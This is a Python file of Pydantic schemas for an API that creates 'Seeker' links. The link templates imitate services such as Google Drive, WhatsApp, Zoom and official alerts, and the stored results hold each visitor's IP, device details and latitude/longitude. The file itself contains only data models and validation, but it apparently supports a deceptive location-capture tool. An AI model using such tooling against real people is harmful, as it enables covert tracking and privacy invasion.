"""Seeker API schemas."""

from __future__ import annotations

from datetime import datetime
from typing import Any
from urllib.parse import urlparse

from pydantic import BaseModel, ConfigDict, Field, field_validator

VALID_TEMPLATES = frozenset(
    {
        "nearyou",
        "gdrive",
        "whatsapp",
        "telegram",
        "zoom",
        "captcha",
        "secure_briefing",
        "clearance_check",
        "secure_message",
        "official_alert",
    }
)


class SeekerLinkCreate(BaseModel):
    """Request body for creating a Seeker link."""

    template: str = Field(
        ...,
        description="Template: nearyou, gdrive, whatsapp, telegram, zoom, captcha, secure_briefing, clearance_check, secure_message, official_alert",
    )
    title: str | None = Field(None, description="Optional campaign title")
    redirect_url: str | None = Field(
        None,
        description="URL to redirect after location is captured",
    )

    @field_validator("template")
    @classmethod
    def validate_template(cls, v: str) -> str:
        """Ensure template is one of the allowed values."""
        if v not in VALID_TEMPLATES:
            raise ValueError(
                f"Invalid template. Must be one of: {sorted(VALID_TEMPLATES)}"
            )
        return v

    @field_validator("redirect_url")
    @classmethod
    def validate_redirect_url(cls, v: str | None) -> str | None:
        """Ensure redirect_url, when provided, is a well-formed http/https URL."""
        if v is None or v == "":
            return None
        parsed = urlparse(v)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("redirect_url must be an http or https URL")
        if not parsed.netloc:
            raise ValueError("redirect_url must have a valid host")
        return v


class SeekerLinkResponse(BaseModel):
    """Response for a Seeker link."""

    model_config = ConfigDict(from_attributes=True, populate_by_name=True)

    id: str
    template: str
    title: str | None
    redirect_url: str | None
    url: str
    created_at: datetime


class SeekerResultResponse(BaseModel):
    """Response for a single Seeker result (device + location)."""

    id: str
    link_id: str
    platform: str | None
    browser: str | None
    ip: str
    ip_info: dict[str, Any] | None
    lat: str | None
    lon: str | None
    accuracy: str | None
    error: str | None
    status: str
    created_at: datetime

    model_config = ConfigDict(from_attributes=True)
